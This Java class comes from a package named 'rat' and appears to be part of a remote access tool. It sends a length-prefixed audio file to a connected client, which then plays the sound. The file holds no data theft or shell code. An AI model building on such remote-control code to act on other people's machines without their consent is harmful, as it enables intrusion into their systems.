package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.fx.Sound;
import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveClient;

public final class AudioPacket implements IPacket {
	
	private byte[] data;
	
	public AudioPacket(final File file) {
		data = FileUtils.readExternalData(file);
	}
	
	public AudioPacket(final String path) {
		data = FileUtils.readExternalData(path);
	}
	
	public AudioPacket() {
		data = new byte[0];
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeInt(data.length);
		client.write(data);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		final int length = client.readInt();
		
		data = new byte[length];
		
		client.read(data);
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final Sound sound = Sound.loadSound(data);
		
		sound.play();
	}
	
}